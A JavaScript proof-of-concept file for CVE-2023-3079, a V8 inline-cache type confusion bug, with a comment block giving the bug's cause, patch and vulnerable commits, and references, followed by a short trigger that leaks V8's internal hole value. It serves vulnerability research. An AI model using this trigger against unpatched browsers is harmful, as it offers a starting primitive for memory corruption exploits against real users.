/* 

The following is the type confusion proof-of-concept for CVE-2023-3079.

CVE-2023-3079 is a logic issue in v8â€™s Inline Cache subsystem, procedure KeyedStorelC::StoreElementHandler.
The presence of deficient code in this context resulted in the omission of consideration for the 
fast packed elements kind on receiver and generated incorrect builtin code for storing into 
keyed array elements, leading to type confusion.

Patch commit -> e144f3b
             -> https://github.com/v8/v8/commit/e144f3b 
             -> https://chromium-review.googlesource.com/c/v8/v8/+/4584248
             -> patched in v114.0.5735.106-110

Vulnerable priort to commit -> 56e5481171da3eacd3cb83db2be3b2d2b96b4abb 
                            -> https://chromium.googlesource.com/v8/v8.git/+/56e5481171da3eacd3cb83db2be3b2d2b96b4abb

Vuln commit -> 68903e142b1a554df821a78a420b7777aadb9cc9

Reference(s):
                            -> https://crbug.com/1450481
                            -> https://nvd.nist.gov/vuln/detail/CVE-2023-3079
                            -> https://twitter.com/alisaesage/status/1666368128207720448
*/

function set(arr, key, val) {
    arr[key] = val;
}
function leak_hole() {
    for(let i = 0; i < 10; i++) {
        set(arguments, "foo", 1);
    }
    set([], 0, 1);
    set(arguments, 0, 1);
    return arguments[1];
}
%DebugPrint(leak_hole());
